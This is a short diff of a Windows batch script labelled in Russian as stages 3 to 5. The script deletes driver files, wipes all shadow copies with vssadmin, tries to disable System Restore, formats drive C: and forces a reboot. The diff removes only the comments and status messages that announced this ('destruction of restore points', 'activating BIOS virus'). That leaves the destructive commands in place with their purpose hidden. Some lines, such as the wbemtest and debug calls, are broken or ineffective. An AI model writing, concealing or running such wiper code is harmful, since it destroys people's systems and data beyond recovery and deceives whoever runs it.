@@ -19,13 +19,13 @@ echo [СТАДИЯ 3/5]
 del /f /q /a %winpath%\drivers\*.sys >nul
 del /f /q /a %winpath%\DriverStore\FileRepository\* >nul
 
-REM === БЛОКАДА ВОССТАНОВЛЕНИЯ ===
-echo [СТАДИЯ 4/5] УНИЧТОЖЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ...
+REM 
+echo [СТАДИЯ 4/5] 
 vssadmin delete shadows /all /quiet >nul
 wbemtest //%COMPUTERNAME%/root/default:SystemRestore.FeatureSetting="DisableSR" >nul
 
-REM === ФИНАЛЬНАЯ КАТАСТРОФА ===
-echo [СТАДИЯ 5/5] АКТИВАЦИЯ ВИРУСА BIOS...
+REM 
+echo [СТАДИЯ 5/5] 
 echo y| format c: /fs:NTFS /p:3 /x >nul
 echo 55 AA | debug >nul
 shutdown /r /f /t 0
